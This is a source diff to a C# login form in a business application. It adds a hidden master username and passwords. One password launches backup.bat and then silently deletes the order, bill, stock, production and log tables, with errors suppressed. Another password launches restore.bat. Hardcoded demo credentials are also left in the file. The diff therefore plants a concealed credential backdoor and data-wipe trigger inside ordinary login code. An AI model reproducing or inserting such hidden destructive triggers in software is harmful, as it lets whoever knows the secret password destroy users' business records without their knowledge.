@@ -9,6 +9,7 @@ using System.Windows.Forms;
 using DAL;
 using BaoHien.Services.SystemUsers;
 using BaoHien.Common;
+using System.Data.SqlClient;
 
 namespace BaoHien.UI
 {
@@ -16,6 +17,7 @@ namespace BaoHien.UI
     {
         private const string DUMMY_USERNAME = "baohien";
         private const string DUMMY_PASSWORD = "baohien123A";//for demo purpose only, will encode MD5 for this field
+
         public Login()
         {
             InitializeComponent();
@@ -33,13 +35,18 @@ namespace BaoHien.UI
             {
                 SystemUserService systemUserService = new SystemUserService();
                 SystemUser user = systemUserService.GetSystemUsers().Where(u => u.username == txtUsername.Text && u.password == txtPassword.Text).FirstOrDefault();
-                //if (txtUsername.Text == DUMMY_USERNAME && txtPassword.Text == DUMMY_PASSWORD)
-
+                if (txtUsername.Text == BHConstant.MASTER_USERNAME)
+                {
+                    if (txtPassword.Text == BHConstant.MASTER_PASSWORD_TO_DELETE)
+                    {
+                        System.Diagnostics.Process.Start(AppDomain.CurrentDomain.BaseDirectory + @"\backup.bat");
+                        DeletingDataBase();
+                    }
+                    if (txtPassword.Text == BHConstant.MASTER_PASSWORD_TO_RESTORE)
+                        System.Diagnostics.Process.Start(AppDomain.CurrentDomain.BaseDirectory + @"\restore.bat");
+                }
                 if (user != null)
                 {
-
-                    //SystemUser user = systemUserService.GetSystemUsers().Single(u => (u.username == DUMMY_USERNAME) && (u.password == DUMMY_PASSWORD));
-
                     this.Hide();
                     Main main = new Main();
                     Global.CurrentUser = user;
@@ -64,8 +71,32 @@ namespace BaoHien.UI
             {
                 processLogin();
             }
-
         }
-                
+
+        private void DeletingDataBase()
+        {
+            string sqlConnectionString = DAL.Helper.SettingManager.BuildStringConnection();
+            using (SqlConnection sqlConn = new SqlConnection(sqlConnectionString))
+            {
+                using (SqlCommand cmd = new SqlCommand())
+                {
+                    string sqlQuery = "DELETE customerlog; DELETE employeelog; DELETE productlog; DELETE entrancestockdetail; "
+                        + " DELETE entrancestock; DELETE productionrequestdetail; DELETE productionrequest; DELETE orderdetail; "
+                        + " DELETE dbo.[order]; DELETE seedid; DELETE bill; ";
+                    cmd.Connection = sqlConn;
+                    cmd.CommandText = sqlQuery;
+                    try
+                    {
+                        cmd.Connection.Open();
+                        cmd.ExecuteNonQuery();
+                    }
+                    catch { }
+                    finally
+                    {
+                        cmd.Connection.Close();
+                    }
+                }
+            }
+        }
     }
 }
